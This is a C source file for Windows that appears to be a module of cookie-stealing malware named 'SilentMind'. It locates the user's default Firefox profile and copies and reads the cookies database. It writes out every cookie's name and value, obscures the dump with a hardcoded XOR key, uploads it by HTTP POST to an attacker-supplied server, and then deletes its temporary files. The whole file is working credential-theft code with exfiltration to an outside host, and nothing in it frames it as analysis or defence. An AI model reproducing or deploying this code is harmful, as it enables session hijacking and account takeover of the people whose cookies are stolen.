#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <time.h>
#include "sqlite3.h"
#include "encrypt.h"

#pragma comment(lib, "wininet.lib")

// Firefox cookie exfiltration functionality
#define MAX_PROFILE_PATH 512
#define COOKIE_FILE "firefox_cookies.txt"

// Find Firefox profile directory - simplified for your specific setup
int find_firefox_profile(char* profile_path, int max_len) {
    char appdata_path[MAX_PATH];
    char firefox_path[MAX_PATH];
    char profiles_ini[MAX_PATH];
    
    // Get AppData\Roaming path
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path) != S_OK) {
        return 0;
    }
    
    // Build Firefox path
    snprintf(firefox_path, sizeof(firefox_path), "%s\\Mozilla\\Firefox", appdata_path);
    
    // Check if Firefox directory exists
    if (GetFileAttributesA(firefox_path) == INVALID_FILE_ATTRIBUTES) {
        return 0;
    }
    
    // Build profiles.ini path
    snprintf(profiles_ini, sizeof(profiles_ini), "%s\\profiles.ini", firefox_path);
    
    // Read profiles.ini to find default profile
    FILE* f = fopen(profiles_ini, "r");
    if (!f) return 0;
    
    char line[256];
    char current_profile[128] = {0};
    int found_default = 0;
    
    while (fgets(line, sizeof(line), f)) {
        // Look for Default=Profiles/... line (your specific format)
        if (strstr(line, "Default=Profiles/")) {
            char* start = strstr(line, "Profiles/");
            if (start) {
                strcpy(current_profile, start + 9); // Skip "Profiles/"
                // Remove newline
                char* nl = strchr(current_profile, '\r');
                if (nl) *nl = 0;
                nl = strchr(current_profile, '\n');
                if (nl) *nl = 0;
                found_default = 1;
                break;
            }
        }
        // Fallback: look for Default=1
        else if (strstr(line, "Default=1")) {
            // Look for Path= line
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line, "Path=", 5) == 0) {
                    strcpy(current_profile, line + 5);
                    // Remove newline
                    char* nl = strchr(current_profile, '\r');
                    if (nl) *nl = 0;
                    nl = strchr(current_profile, '\n');
                    if (nl) *nl = 0;
                    found_default = 1;
                    break;
                }
            }
            break;
        }
    }
    fclose(f);
    
    if (!found_default) return 0;
    
    // Build full profile path
    snprintf(profile_path, max_len, "%s\\Profiles\\%s", firefox_path, current_profile);
    return 1;
}

// Callback function for SQLite query results
int cookie_callback(void* data, int argc, char** argv, char** azColName) {
    FILE* cookie_file = (FILE*)data;
    static int cookie_count = 0;
    
    cookie_count++;
    fprintf(cookie_file, "Cookie #%d:\n", cookie_count);
    fprintf(cookie_file, "  Domain: %s\n", argv[2] ? argv[2] : "unknown");
    fprintf(cookie_file, "  Name: %s\n", argv[0] ? argv[0] : "unknown");
    fprintf(cookie_file, "  Value: %s\n", argv[1] ? argv[1] : "unknown");
    fprintf(cookie_file, "  Path: %s\n", argv[3] ? argv[3] : "/");
    fprintf(cookie_file, "  Expires: %s\n", argv[4] ? argv[4] : "0");
    fprintf(cookie_file, "  Secure: %s\n", argv[6] ? argv[6] : "0");
    fprintf(cookie_file, "  HttpOnly: %s\n", argv[5] ? argv[5] : "0");
    fprintf(cookie_file, "\n");
    
    return 0;
}

// Proper SQLite-based cookie extraction
int extract_firefox_cookies(char* output_path) {
    char profile_path[MAX_PROFILE_PATH];
    char cookies_db_path[MAX_PROFILE_PATH + 32];
    char temp_db_path[MAX_PATH];
    sqlite3* db;
    char* err_msg = 0;
    int rc;
    FILE* cookie_file;
    
    // Find Firefox profile
    if (!find_firefox_profile(profile_path, sizeof(profile_path))) {
        return 0;
    }
    
    // Build cookies.sqlite path
    snprintf(cookies_db_path, sizeof(cookies_db_path), "%s\\cookies.sqlite", profile_path);
    
    // Check if cookies.sqlite exists
    if (GetFileAttributesA(cookies_db_path) == INVALID_FILE_ATTRIBUTES) {
        return 0;
    }
    
    // Create a temporary copy of the database (in case it's locked)
    GetTempPathA(MAX_PATH, temp_db_path);
    strcat(temp_db_path, "firefox_cookies_temp.db");
    
    if (!CopyFileA(cookies_db_path, temp_db_path, FALSE)) {
        return 0;
    }
    
    // Open SQLite database
    rc = sqlite3_open(temp_db_path, &db);
    if (rc) {
        return 0;
    }
    
    // Open output file
    cookie_file = fopen(output_path, "w");
    if (!cookie_file) {
        sqlite3_close(db);
        return 0;
    }
    
    // Write header
    fprintf(cookie_file, "=== FIREFOX COOKIES ===\n");
    fprintf(cookie_file, "Database: %s\n\n", cookies_db_path);
    
    // Query cookies from moz_cookies table
    const char* sql = "SELECT name, value, host, path, expiry, isHttpOnly, isSecure, sameSite FROM moz_cookies ORDER BY host, name";
    rc = sqlite3_exec(db, sql, cookie_callback, cookie_file, &err_msg);
    
    if (rc != SQLITE_OK) {
        fprintf(cookie_file, "Error querying cookies: %s\n", err_msg);
        sqlite3_free(err_msg);
    }
    
    fclose(cookie_file);
    sqlite3_close(db);
    DeleteFileA(temp_db_path); // Clean up temp file
    
    return 1;
}

// Main function to exfiltrate Firefox cookies
int exfiltrate_firefox_cookies(const char* server_ip, int port) {
    char temp_path[MAX_PATH];
    char cookie_file_path[MAX_PATH];
    char encrypted_file_path[MAX_PATH];
    
    // Get temp directory
    GetTempPathA(MAX_PATH, temp_path);
    snprintf(cookie_file_path, sizeof(cookie_file_path), "%s\\%s", temp_path, COOKIE_FILE);
    
    // Extract cookies
    if (!extract_firefox_cookies(cookie_file_path)) {
        return 0;
    }
    
    // Read cookie file
    FILE* f = fopen(cookie_file_path, "rb");
    if (!f) return 0;
    
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    rewind(f);
    
    if (file_size <= 0) {
        fclose(f);
        return 0;
    }
    
    // Read file content
    char* file_content = (char*)malloc(file_size + 1);
    if (!file_content) {
        fclose(f);
        return 0;
    }
    
    fread(file_content, 1, file_size, f);
    file_content[file_size] = '\0';
    fclose(f);
    
    // Encrypt the content
    const char* key = "SILENTMIND";
    int key_len = strlen(key);
    for (int i = 0; i < file_size; i++) {
        file_content[i] ^= key[i % key_len];
    }
    
    // Upload to server
    HINTERNET hSession = InternetOpen("SilentMind", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) {
        free(file_content);
        return 0;
    }
    
    HINTERNET hConnect = InternetConnect(hSession, server_ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        free(file_content);
        return 0;
    }
    
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/api/upload", NULL, NULL, NULL,
                                         INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        free(file_content);
        return 0;
    }
    
    // Set headers
    char headers[512];
    snprintf(headers, sizeof(headers),
             "Content-Type: application/octet-stream\r\n"
             "X-Filename: firefox_cookies.txt\r\n");
    
    BOOL result = HttpSendRequest(hRequest, headers, strlen(headers), file_content, file_size);
    
    // Cleanup
    free(file_content);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    
    // Delete temp file
    DeleteFileA(cookie_file_path);
    
    return result ? 1 : 0;
}
